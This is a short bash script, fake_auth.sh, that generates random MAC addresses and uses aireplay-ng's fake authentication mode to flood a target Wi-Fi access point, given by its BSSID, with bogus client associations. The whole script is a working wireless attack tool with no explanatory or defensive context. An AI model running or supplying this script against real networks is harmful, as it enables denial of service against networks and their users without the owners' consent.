if [ $# -ne 3 ];then
    echo 'Invalid Usage'
    echo 'fake_auth.sh number_of_fake_addresses target_network_bssid adapter_name'
    exit
fi

for (( i=0;i<$1;i++ ))
do
    mac=''
    for (( j=0;j<6;j++ ))
    do
        num=$RANDOM
        (( num %= 9 ))
        mac=$mac$num
        num=$RANDOM
        (( num %= 9 ))
        mac=$mac$num
        if (( j != 5 ));then
            mac=$mac:
        fi
    done
    cmd='sudo aireplay-ng --fakeauth 0 -a '$2' -h '$mac' '$3
    clear
    $cmd
done